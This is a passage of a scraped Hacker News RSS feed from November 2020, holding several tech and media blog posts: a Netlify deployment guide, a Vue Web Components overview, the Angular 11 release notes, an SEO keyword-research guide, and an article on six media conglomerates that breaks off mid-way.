<img src="https://blog.m3o.com/assets/images/deploysettings.png">
</center>

<p><br>
You can copy the below settings for ease of use. Where you see ‘concert-celtic-uncover’ replace it with your namespace from <code>micro user namespace</code> on the CLI. 
We need this to know what backend API to call.</p>

<div><div><pre><code>Repository        github.com/m3o/blog-frontend
Base directory    Not set
Build command     sed -i 's/micro/concert-celtic-uncover/g' ./src/environments/environment.prod.ts &amp;&amp; ng build --prod &amp;&amp; cp ./src/assets/_redirects ./dist/blog-frontend
Publish directory dist/blog-frontend
</code></pre></div></div>

<p>As you can see, it’s the original <code>m3o/blog-frontend</code> being deployed in the example, but in your case <code>m3o</code> will be replaced with your fork. 
This is because Netlify asks for the permissions to the repo.</p>

<p>The build command is a bit involved, here is what it’s doing:</p>

<div><div><pre><code><span># Replace the micro namespace with your own</span>
<span>namespace</span><span>=</span><span>$(</span>micro user namespace<span>)</span>

<span>sed</span> <span>-i</span> <span>"s/micro/</span><span>$namespace</span><span>/g"</span> ./src/environments/environment.prod.ts

<span># It's an angular app, so we have to ng build</span>
ng build <span>--prod</span>

<span># Single page …</span></code></pre></div></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html</a></em></p>]]>
            </description>
            <link>https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068782</guid>
            <pubDate>Thu, 12 Nov 2020 11:44:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vue – Introduction to Web Components]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068730">thread link</a>) | @oczek
<br/>
November 12, 2020 | https://blog.graphqleditor.com/vue-webcomponents/ | <a href="https://web.archive.org/web/*/https://blog.graphqleditor.com/vue-webcomponents/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://blog.graphqleditor.com/vue-overview/">In my previous blog post I outlined what Vue is</a> and went through a bit of its history and versions one through three and their key features. Like I mentioned there <strong>Web Components have long been a key part of Vue and they are a powerful feature</strong> that deserves a bit more than a brief mention. If you’re not familiar with Vue or you just want to read about it head on here, if not let’s get right into Web Components and what they’re all about.</p>
<h2>The basics</h2>
<p>Web Components are a set of features that let you create new custom, reusable, encapsulated HTML tags for use in web pages and apps. They are supported by every major browser and are backwards compatible through Javascript-based custom libraries. Basically they can be used with any JavaScript library or framework that works with HTML. To be precise Web Components consist of three technologies which work together:</p>
<ul>
<li><strong>Custom Elements</strong> - HTML elements with custom behaviours, templates and tag names made with a set of JavaScript APIs,</li>
<li><strong>Shadow DOM</strong> - a ‘<em>DOM within a DOM</em>’ it’s its own isolated DOM tree with its own elements and styles completely separate from the original DOM. This allows encapsulation and componentization natively on the web platform without having to rely on iframes,</li>
<li><strong>HTML Templates</strong> - a tool for holding HTML which is not to be rendered when a page is loaded but instead can be instantiated when called upon.</li>
</ul>
<h2>What’s that got to do with Vue?</h2>
<p>Now with that brief outline of the general functionality of Web Components behind us, let’s focus on where Vue comes in. As mentioned previously the new features in Vue 3 are a major help here when it comes to components. The Composition API offers more flexibility as code can now be organized as functions, each dealing with a specific feature. It also makes extracting and reusing logic between components much easier. Teleport allows specifying template HTML that can be sent to another part of the DOM or even outside the scope of the app. Which is useful if one component has some HTML that has to get rendered in an alternative location for example if it’s run on a widget or a small part of the webpage. Additionally Vue has long provided the ability to package SFCs or single file components as a Web Component, which basically lets you create and use your own custom HTML tags. </p>
<p><span>
      <a href="https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/efb68/teleport_vue.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Teleport in Vuejs" title="Teleport in Vuejs" src="https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/fcda8/teleport_vue.png" srcset="https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/12f09/teleport_vue.png 148w,
https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/e4a3f/teleport_vue.png 295w,
https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/fcda8/teleport_vue.png 590w,
https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/efc66/teleport_vue.png 885w,
https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/c83ae/teleport_vue.png 1180w,
https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/efb68/teleport_vue.png 2032w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h5>Source: <a href="https://v3.vuejs.org/guide/teleport.html">Vuejs.org</a></h5>
<h2>You’re not on your own</h2>
<p>All this makes Vue a very straightforward and easily customizable tool for developers wanting to work with Web Components. As I mentioned you can quite easily start working on your own components or you can hop on GitHub and check out some of those made by the community. Let’s take a look at that:</p>
<ul>
<li><strong>Vuetify</strong> - a UI framework built on top of Vue.js lets you create clean, semantic, reusable UI components and works with Vue’s Server Side Rendering (SSR). It provides over 80 Vue components which makes for a pretty nice base for creating apps with way less effort.</li>
<li><strong>Vue Material</strong> - a scalable library made exactly in accordance with the Google Material Design specs. Contains over 56 components useful for making complex app shells and will help make apps that can fit on every screen with support for all modern Web Browsers.</li>
<li><strong>Quasar</strong> - a full-fledged framework that supports features like minification and caching. Additionally it provides components for your framework, over 80 of them in fact. It also provides support for each build mode (SPA, SSR, PWA, Mobile app, Desktop app &amp; Browser Extension) and has tight integration with its own CLI. Quasar is fairly extensive and has in-depth documentation and robust end-to-end implementation.   </li>
<li><strong>Buefy</strong> - lightweight UI component library based on Vue and Bulma (a CSS framework) Simply put Buefy provides a JavaScript layer for interfaces created with Bulma CSS. If you’re looking to build apps with a simple and intuitive interface this tool will help you hit the ground running.</li>
<li><strong>iView</strong> - a Vue.js 2.0 based library which provides a number of high quality UI components and widgets. It also has its own CLI tool, iView-cli, which has a visual tool for component scaffolding and an offline version of the documentation. If you’re into neat and elegant design this is the way to go.</li>
</ul>
<p><span>
      <a href="https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/00d43/vue_libs.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Vue Web Components libraries" title="Vue Web Components libraries" src="https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/fcda8/vue_libs.png" srcset="https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/12f09/vue_libs.png 148w,
https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/e4a3f/vue_libs.png 295w,
https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/fcda8/vue_libs.png 590w,
https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/efc66/vue_libs.png 885w,
https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/00d43/vue_libs.png 1000w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h2>Which to choose?</h2>
<p>That’s a lot of components right? The idea is to help get your project off the ground as quickly and easily as possible by providing you with a base of useful components. This way you can start working on your app right away without spending time on making your own components. Not that there’s anything wrong with that, you can add our own components and Vue is a great help with that. Bear in mind most of these tools are geared towards a certain type of app, so you’ll have to check out which one fits your needs best. There’s plenty to choose from on GitHub, you can use them, join one of the communities behind those mentioned above and improve it or even create your own libraries to help others. The possibilities here are almost limitless.</p></div><p>The GraphQL Editor is a supportive tool for both advanced GraphQL users as well as those taking their first steps with GraphQL APIs. Our all-in-one development environment for GraphQL will help you build, manage &amp; deploy your GraphQL API much faster thanks to dozens of built-in micro features. Its graphical interface will also fix communication within your product team. Visualization is the key!</p></div>]]>
            </description>
            <link>https://blog.graphqleditor.com/vue-webcomponents/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068730</guid>
            <pubDate>Thu, 12 Nov 2020 11:33:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Angular 11]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 190 (<a href="https://news.ycombinator.com/item?id=25068668">thread link</a>) | @amitport
<br/>
November 12, 2020 | https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7 | <a href="https://web.archive.org/web/*/https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@markathompson?source=post_page-----74721b7952f7--------------------------------" rel="noopener"><img alt="Mark Techson" src="https://miro.medium.com/fit/c/96/96/1*2hqK0rVXWghtk_RLFx33oA.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Photo of a Torch Ginger by Jules Kremer" src="https://miro.medium.com/max/2368/0*55kr1t601sp22pkE" width="1184" height="1091" srcset="https://miro.medium.com/max/552/0*55kr1t601sp22pkE 276w, https://miro.medium.com/max/1104/0*55kr1t601sp22pkE 552w, https://miro.medium.com/max/1280/0*55kr1t601sp22pkE 640w, https://miro.medium.com/max/1400/0*55kr1t601sp22pkE 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*55kr1t601sp22pkE?q=20"></p></div></div></div><figcaption>Photo of a Torch Ginger by Jules Kremer</figcaption></figure><p id="1feb"><strong>Welcome to the Angular version 11 release.</strong></p><p id="1877">Version 11.0.0 is here and we’ve got some great updates for Angular developers everywhere. This release has updates across the platform including the framework, the CLI and components. Let’s dive in!</p><h2 id="1182">Updates on Operation Byelog</h2><p id="593b">When we shared <a href="https://angular.io/guide/roadmap" rel="noopener">Angular’s Roadmap</a>, one of the items was Operation Byelog where we committed to putting a significant engineering effort towards triaging issues and PRs until we have a clear understanding of the broader community needs. We can now report that the original goal is complete! We’ve triaged all the issues in all three of the monorepos and will continue this as an ongoing effort as new issues get reported.</p><p id="bc06">This is our commitment: Going forward all new issues reported will be triaged within 2 weeks.</p><p id="2104">In the process, we resolved a few <a href="https://github.com/angular/angular/issues/12842" rel="noopener">popular</a> <a href="https://github.com/angular/angular/issues/18469" rel="noopener">issues</a> in the <a href="https://github.com/angular/angular/issues/13011" rel="noopener">router</a> and <a href="https://github.com/angular/angular/issues/14542" rel="noopener">forms</a>.</p><p id="a1cd">Also, we’ve closed the <a href="https://github.com/angular/angular/issues/11405" rel="noopener"><em>third most popular issue</em></a><em>!</em></p><p id="5773">Now, we’re planning the next steps to support the Angular community. We’ll continue triaging and fixing issues, and work towards improving our processes for accepting community contributions.</p><h2 id="4683">Automatic Inlining of Fonts</h2><p id="6a67">To make your apps even faster by speeding up their <a href="https://web.dev/first-contentful-paint/" rel="noopener">first contentful paint</a>, we’re introducing automatic font inlining. During compile time Angular CLI will download and inline fonts that are being used and linked in the application. We enable this by default in apps built with version 11. All you need to do to take advantage of this optimization is update your app!</p><h2 id="124e">Component Test Harnesses</h2><p id="78d2">In Angular v9 we introduced Component Test Harnesses. They provide a robust and legible API surface to help with testing Angular Material components. It gives developers a way to interact with Angular Material components using the supported API during testing.</p><p id="2932">Releasing with version 11, we have harnesses for all of the components! Now developers can create more robust test suites.</p><p id="3e07">We’ve also included performance improvements and new APIs. The <em>parallel</em> function makes working with asynchronous actions in your tests easier by allowing developers to run multiple asynchronous interactions with components in parallel. The <em>manualChangeDetection</em> function gives developers access to finer grained control of change detection by disabling automatic change detection in unit tests.</p><p id="752c">For more details and examples of these APIs and other new features, be sure to check out the <a href="http://material.angular.io/cdk/test-harnesses/overview" rel="noopener">documentation for Angular Material</a> Test Harnesses!</p><h2 id="173a">Improved Reporting and Logging</h2><p id="968c">We’ve made changes to the builder phase reporting to make it even more helpful during development. We are bringing in new CLI output updates to make logs and reports easier to read.</p><figure><div><div><p><img alt="Screenshot of angular CLI output nicely formatted into columns." src="https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX" width="607" height="355" srcset="https://miro.medium.com/max/552/0*-dCa80651cnfbjpX 276w, https://miro.medium.com/max/1104/0*-dCa80651cnfbjpX 552w, https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX 607w" sizes="607px" data-old-src="https://miro.medium.com/max/60/0*-dCa80651cnfbjpX?q=20"></p></div></div><figcaption>Improved CLI output formatting</figcaption></figure><h2 id="970e">Updated Language Service Preview</h2><p id="650a">The Angular Language Service provides helpful tools to make development with Angular productive and fun. The current version of the language service is based on View Engine and today we’re giving a sneak peek of the Ivy-based language service. The updated language service provides a more powerful and accurate experience for developers.</p><p id="15e6">Now, the language service will be able to correctly infer generic types in templates the same way the TypeScript compiler does. For example, in the screenshot below we’re able to infer that the iterable is of type string.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Screenshot of intellisense style insights in Angular templates." src="https://miro.medium.com/max/3000/0*L1Tg13gdu3PCqUNN" width="1500" height="902" srcset="https://miro.medium.com/max/552/0*L1Tg13gdu3PCqUNN 276w, https://miro.medium.com/max/1104/0*L1Tg13gdu3PCqUNN 552w, https://miro.medium.com/max/1280/0*L1Tg13gdu3PCqUNN 640w, https://miro.medium.com/max/1400/0*L1Tg13gdu3PCqUNN 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*L1Tg13gdu3PCqUNN?q=20"></p></div></div></div><figcaption>Angular Language Service inferring iterable types in templates</figcaption></figure><p id="e67f">This powerful new update is still in development but we wanted to share an update as we keep preparing it for a full release in an upcoming version.</p><h2 id="48a5">Updated Hot Module Replacement (HMR) Support</h2><p id="303f">Angular has offered support for HMR but enabling it required configuration and code changes making it less than ideal to quickly include in Angular projects. In version 11 we’ve updated the CLI to allow enabling HMR when starting an application with ng serve. To get started, run the following command:</p><pre><span id="3ac4">ng serve --hmr</span></pre><p id="f3bc">After the local server starts the console will display a message confirming that HMR is active:</p><p id="f521">NOTICE: Hot Module Replacement (HMR) is enabled for the dev server.</p><p id="5155">See <a href="https://webpack.js.org/guides/hot-module-replacement" rel="noopener">https://webpack.js.org/guides/hot-module-replacement</a> for information on working with HMR for webpack.</p><p id="3796">Now during development the latest changes to components, templates and styles will be instantly updated into the running application. All without requiring a full page refresh. Data typed into forms are preserved as well as scroll position providing a boost to developer productivity.</p><h2 id="6de3">Faster Builds</h2><p id="630c">We’re bringing a faster development and build cycle by making updates to some key areas.</p><ul><li id="4336">When installing dependencies, the ngcc update process is now 2–4x faster.</li><li id="b30d">Faster compilation with TypeScript v4.0.</li></ul><p id="ed18">Now, teams can opt-in to webpack v5. Currently, you could experiment with <a href="https://webpack.js.org/concepts/module-federation/" rel="noopener">module federation</a>. In the future, webpack v5 will clear the path for:</p><ul><li id="db89">Faster builds with persistent disk caching</li><li id="7ab4">Smaller bundles thanks to <a href="https://webpack.js.org/guides/tree-shaking/" rel="noopener">cjs tree-shaking</a></li></ul><p id="dae8">Support is experimental and under development so we don’t recommend opting in for production uses.</p><p id="4ca8">Want to try out webpack 5? To enable it in your project, add the following section to your package.json file:</p><pre><span id="386c">"resolutions": {<br>     "webpack": "5.4.0"<br>}</span></pre><p id="65a0">Currently, you’ll need to use <strong>yarn</strong> to test this as npm does not yet support the resolutions property.</p><h2 id="d0a9">Linting</h2><p id="e4b2">In previous versions of Angular, we’ve shipped a default implementation for linting (TSLint). Now, TSLint is deprecated by the project creators who recommend migration to ESLint. <a href="https://twitter.com/mrjameshenry" rel="noopener">James Henry</a> together with other folks from the open-source community developed a third-party solution and migration path via <a href="https://github.com/typescript-eslint/typescript-eslint" rel="noopener">typescript-eslint</a>, <a href="https://github.com/angular-eslint/angular-eslint" rel="noopener">angular-eslint</a> and <a href="https://github.com/typescript-eslint/tslint-to-eslint-config" rel="noopener">tslint-to-eslint-config</a>! We’ve been collaborating closely to ensure a smooth transition of Angular developers to the supported linting stack.</p><p id="6071">We’re deprecating the use of TSLint and Codelyzer in version 11. This means that in future versions the default implementation for linting Angular projects will not be available.</p><p id="806d">Head over to the <a href="https://github.com/angular-eslint/angular-eslint#migrating-from-codelyzer-and-tslint" rel="noopener">official project page</a> for a guide to incorporate angular-eslint in a project and migrate from TSLint.</p><h2 id="98a6">Housekeeping</h2><p id="0727">In this update we’re removing support for IE9/IE10 and IE mobile. IE11 is the only version of IE <a href="https://angular.io/guide/browser-support" rel="noopener">still supported</a> by Angular. We’ve also <a href="https://angular.io/guide/deprecations" rel="noopener">removed deprecated APIs</a> and added a few to the deprecation list. Be sure to check this out to make sure you are using the latest APIs and following our recommended best practices.</p><h2 id="a3c7">Roadmap</h2><p id="9aad">We’ve also updated the <a href="https://angular.io/guide/roadmap" rel="noopener">roadmap</a> to keep you posted on our current priorities. Some of the announcements in this post are updates on in-progress projects from the roadmap. This reflects our approach to incrementally rollout larger efforts and allows developers to provide early feedback that we can incorporate it into the final release.</p><p id="8c07">We collaborated with <a href="https://twitter.com/simpulton" rel="noopener">Lukas Ruebbelke</a> from the Angular community on updating the content of some of the projects to better reflect the value they provide to developers.</p><h2 id="6939">How to update to get version 11</h2><p id="0170">When you are ready to go run this command to update Angular and CLI:</p><pre><span id="5983">ng update @angular/cli @angular/core</span></pre><p id="ac5f">Head over to <a href="https://update.angular.io/" rel="noopener">update.angular.io</a> to find detailed information and guidance on updating. We always recommend upgrading one major release at a time to have the best update experience.</p><p id="732f">We hope you enjoy this feature update and be sure to let us know what you think here or on <a href="https://twitter.com/angular" rel="noopener">Twitter</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068668</guid>
            <pubDate>Thu, 12 Nov 2020 11:19:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Practical SEO Guide for Better Organic Traffic]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068655">thread link</a>) | @moeminm
<br/>
November 12, 2020 | https://blog.moeminmamdouh.com/step-by-step-practical-seo-guide-for-better-organic-traffic | <a href="https://web.archive.org/web/*/https://blog.moeminmamdouh.com/step-by-step-practical-seo-guide-for-better-organic-traffic">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1605179738846/BbIWPgv0m.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><blockquote>
<p>You can find the links to all tools used at the end of the article.</p>
</blockquote>
<p>Paid advertising is great and all, but it stops once the money stops. I'm going to show you a step by step guide on how to do keyword research and use that to your advantage to create compelling articles that could potentially grow organically.</p>
<p>To do this, I'll use <a target="_blank" href="https://splitbee.io/?ref=blog.moeminmamdouh.com">Splitbee</a> as an example, it's a web analytics tool. </p>

<p>You need to first have an idea of who your competitors are in the market. A quick search on Google shows Clicky to be a similar service. Great, you've identified one competitor, we need more. Head over to <a target="_blank" href="https://www.similarweb.com/?ref=blog.moeminmamdouh.com">SimilarWeb</a>, search for your competitor's website, and scroll down to competitors. Pick 3-4 competitors and write them down somewhere.</p>

<p>You have 3-4 competitors written down, time to know what they're ranking for. Head over to <a target="_blank" href="https://neilpatel.com/ubersuggest/?ref=blog.moeminmamdouh.com">UberSuggest</a>, search for your competitors' websites, scroll down until you see '<strong>View all SEO keywords this domain ranks for</strong>" click.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605178434141/ZhquNa08n.png?auto=format&amp;q=60" alt="screely-1605178426390.png"></p>
<p>Now click on '<strong>Export to CSV</strong>'. You now have a list of keywords in a searchable file. Do this for all your competitors. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605178529872/VagIrc31X.png?auto=format&amp;q=60" alt="screely-1605178508313.png"></p>

<p>You'll most likely have hundreds of keywords in 1 CSV file. Import your CSV file into Excel. Apply conditional formatting to these columns:</p>
<p>1- Volume &gt; 1000</p>
<p>2- Position &lt; 20</p>
<p>3- SEO Difficulty &lt; 40</p>
<p>You're basically narrowing down to keywords that receive traffic, are ranked either in the first or second page, and are not too difficult to rank for. Do you just go ahead and create an article with all the keywords you've just narrowed? No. There's still more work to do!</p>

<p>After you've narrowed down the keywords, it's time to validate the keywords via Google Trends and/or Google Keyword Planner. Go to Google Trends and search for the keywords you've just narrowed and make sure to set the region to Worldwide. For example, I now have a keyword 'web stats site'. Is it receiving enough interest? Google's metric is /100. Most popular is 100, least popular is 0, and 50 is half-half. My keyword is spiking, at times it's 90, others 40, and sometimes 0. That's okay, we can gamble.</p>
<p>I now have 1 validated keyword, it's receiving &gt; 1000 traffic per mo, it's relatively low positioned, and isn't difficult to rank for.</p>

<p>Now....do you just use the keyword 'web stats site' in your title? No. Be creative. Write a blog article about '<em>Analyzing web site stats with Google Analytics</em>'. Sometimes the keywords don't make sense, run it through Ubersuggest again and look through the 'Keyword Ideas' section, maybe you'll find a better keyword. </p>
<p>I hope this was a somewhat helpful article to get you into keyword research and planning. It's a great boost and I think you should take advantage of it to boost your organic traffic! </p>
<p><strong>Tools used in this article:</strong></p>
<p>1- <a target="_blank" href="https://neilpatel.com/ubersuggest/?ref=blog.moeminmamdouh.com">UberSuggest</a></p>
<p>2- <a target="_blank" href="https://www.similarweb.com/?ref=blog.moeminmamdouh.com">SimilarWeb</a></p>
<p>3- <a target="_blank" href="https://trends.google.com/trends/?geo=US">Google Trends</a></p>
<p>4- <a target="_blank" href="https://ads.google.com/aw/keywordplanner">Google Keyword Ad Planner</a></p>
<p>Let me know if you have any questions and I'll be more than glad to help!</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.moeminmamdouh.com/step-by-step-practical-seo-guide-for-better-organic-traffic</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068655</guid>
            <pubDate>Thu, 12 Nov 2020 11:16:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Companies That Own (Almost) All Media]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068634">thread link</a>) | @mrfusion
<br/>
November 12, 2020 | https://www.webfx.com/blog/internet/the-6-companies-that-own-almost-all-media-infographic/ | <a href="https://web.archive.org/web/*/https://www.webfx.com/blog/internet/the-6-companies-that-own-almost-all-media-infographic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="description articleBody">



                            <p>In modern America, it feels like you have an unlimited variety of entertainment and media options right at your fingertips.</p>
<p>Television, film, and video game companies seem to come out of the woodwork in today’s startup-centric economy. Who knows what they’ll do next? But while it may&nbsp;<em>seem</em> like you have limitless options, most of the media you consume is owned by one of six companies. These six media companies are known as The Big 6.</p>
<p>While independent media outlets still exist (and there are a&nbsp;<em>lot</em> of them), the major outlets are almost all owned by these six conglomerates. To be clear, “media” in this context does not refer just to news outlets — it refers to any medium that controls the distribution of information. So here, “media” includes 24-hour news stations, newspapers, publishing houses, Internet utilities, and even video game developers.</p>

<p>With that in mind, let’s take a look at each of The Big 6, who control them, and what they own.</p>
<p><img data-src="https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic3.jpg" alt="" width="500" height="4484" src="https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic3.jpg"></p>
<p><img data-src="https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic32.jpg" alt="" width="500" height="4872" srcset="https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic32.jpg 500w, https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic32-105x1024.jpg 105w" sizes="(max-width: 500px) 100vw, 500px" src="https://www.webfx.com/blog/wp-content/uploads/2017/05/the-6-companies-that-own-almost-all-media-infographic32.jpg"></p>
<h2>Media Conglomerate #1: National Amusements</h2>
<p>Unless you’re directly involved in business and / or entertainment, you’ve probably never heard of National Amusements before.</p>
<p>The company owns movie theaters throughout the world — about 950 total — but it owns much more than just movie theaters.</p>
<p>NA’s huge collection of properties is staggering. Whether they own a company entirely, possess majority shares, or even own minority voting shares, the scope of NA’s reach is enormous for a company that’s known less than its subsidiaries.</p>
<p>To start our look at NA, let’s check out one of the biggest names in modern business — Sumner Redstone.</p>
<h3>Head: Sumner Redstone</h3>
<p>Sumner Redstone is the current owner of National Amusements and all of its properties. While his daughter Shari has the title of President, Sumner Redstone retains most of the control over the company.</p>
<p>NA was first founded by Sumner Redstone’s father Michael Redstone, making National Amusements one of the most powerful and successful corporate dynasties in the United States.</p>
<p>None of the Redstones publish their salaries. After all, National Amusements is a private company.</p>
<p>However, finance experts can guess at Sumner Redstone’s overall net worth.</p>
<p>His net worth refers to the total financial value of what Sumner Redstone owns, minus any outstanding debts.</p>
<p>As he nears his 94th birthday in 2017, Sumner Redstone (and his estate) is worth an estimated $4.6 billion, according to&nbsp;<em>Forbes</em>.</p>
<center></center><p>While a decent amount of that value comes from his stake in National Amusements, much more of it comes from the companies that he owns.</p>
<h3>TV and Film Assets</h3>
<p>The most famous assets of National Amusements are almost all Viacom and CBS properties.</p>
<p>Combined, they make up the lion’s share of NA’s television and film acquisitions.</p>
<center></center><p>Still, that’s only a portion of what NA owns.</p>
<h3>Print Assets</h3>
<p>National Amusements has a modest collection of print publishers, but they’re pretty well-known.</p>
<p>The most well-known is Simon and Schuster, which National Amusements acquired when it purchased Viacom in 1999.</p>
<center></center>
<h3>Video Game Assets</h3>
<p>Along with other entertainment assets, National Amusements controls CBS Games.</p>
<p>Since its acquisition, CBS Games has rebranded to CBS Interactive, which now controls well-known gaming websites that we’ll look at next.</p>
<center></center>
<h3>Internet Assets</h3>
<p>With CBS Interactive, National Amusements controls giant chunks of the video game news and sports news industries.</p>
<p>These brands include GameSpot, Metacritic, c|net, and 247-Sports.</p>
<center></center>
<h2>Media Conglomerate #2: Disney</h2>
<p>Disney is probably the most well-known media name on this list.</p>
<p>The company has a hand in just about every medium in the world from children’s cinema to sports.</p>
<p>When it comes to television and film, there’s a good chance you’re watching something owned by the Disney company — even if it doesn’t have Disney’s name.</p>
<p>Why?</p>
<p>They own so,&nbsp;<em>so</em>&nbsp;much.</p>
<p>Let’s start with the company’s leader.</p>
<h3>Head: Bob Iger</h3>
<p>Disney announced Bob Iger as CEO on March 13, 2005, following the departure of Michael Eisner.</p>
<p>Since then, Iger has run a campaign of mergers and acquisitions to expand Disney into an even greater media powerhouse, especially with the acquisition of Marvel ($4 billion) and Lucasfilm ($4 billion).</p>
<p>His published salary is $44.9 million. That breaks down to:</p>
<ul>
<li>$1.73 million per paycheck</li>
<li>$172,692.32 per day</li>
<li>$21,586.54 per hour</li>
</ul>
<center></center><p>Why does Iger make so much money?</p>
<p>He (technically) oversees all of the following companies.</p>
<h3>TV and Film Assets</h3>
<p>First, let’s look at the bread and butter of Disney — television, and film.</p>
<p>Considering they have theme parks built to their entertainment assets, it’s clear that Disney is best known for its TV and film properties.</p>
<p>There are so many different companies that you really just have to see it for yourself.</p>
<center><img data-src="https://www.webfx.com/blog/wp-content/uploads/2017/05/07-disney-tv-and-film.png" alt="" width="555" height="820" srcset="https://www.webfx.com/blog/wp-content/uploads/2017/05/07-disney-tv-and-film.png 555w, https://www.webfx.com/blog/wp-content/uploads/2017/05/07-disney-tv-and-film-203x300.png 203w" sizes="(max-width: 555px) 100vw, 555px" src="https://www.webfx.com/blog/wp-content/uploads/2017/05/07-disney-tv-and-film.png"></center>
<h3>Print Assets</h3>
<p>Disney’s print assets are a mix of proprietary publishers, Lucasfilm acquisitions, and Marvel properties.</p>
<p>The mix gives Disney a controlling interest in massive publishing niches, especially comic books, and science fiction novels.</p>
<p>Disney also owns ESPN, which has its own publishing arm for all things sports.</p>
<center></center>
<h3>Video Game Assets</h3>
<p>Finally, Disney owns a few video game assets.</p>
<p>They’re not huge, but they’re enough to keep Disney mildly competitive and up-to-date in the video game industry (especially mobile gaming).</p>
<p>GameStar, a subsidiary of Disney Interactive Studios, is one of the best-known video game developers bought by Disney.</p>
<center></center>
<h2>Media Conglomerate #3: TimeWarner</h2>
<p>At the time of publication (11/7/16), it’s possible that ATandT will soon buy TimeWarner for around $80 billion.</p>
<p>If that happens, ATandT will acquire everything below and more.</p>
<p>In the meantime, let’s take a more in-depth look at TimeWarner and what it owns.</p>
<h3>Head: Jeff Bewkes</h3>
<p>Jeff Bewkes is the CEO of TimeWarner. He makes $32.5 million per year.</p>
<p>That works out to:</p>
<ul>
<li>$1.25 million per paycheck</li>
<li>$125,000 per workday</li>
<li>$15,625 per hour</li>
</ul>
<center></center><p>So why does one American earn&nbsp;<a href="http://statisticstimes.com/economy/countries-by-projected-gdp.php"><span>the make as much money as Micronesia</span></a>&nbsp;in a year?</p>
<p>As the head of TimeWarner, he’s responsible for all of the following companies.</p>
<h3>TV and Film Assets</h3>
<p>TimeWarner owns an incredible amount of television and film properties.</p>
<p>The most famous is probably Warner Brothers Animation Studios, which owns properties like Looney Tunes.</p>
<p>Along with that, TimeWarner has joint ventures in The CW and Hulu, along with ultra-niche TV programming for medical waiting rooms.</p>
<p>TimeWarner has also played a big role in comic book adaptations into movies, most notably with Batman.</p>
<p>Last, TimeWarner’s HBO branch achieved global renown with its runaway fantasy drama&nbsp;<em>Game of Thrones</em>, an adaptation of George R. R. Martin’s&nbsp;<em>A Song of Ice and Fire</em>.</p>
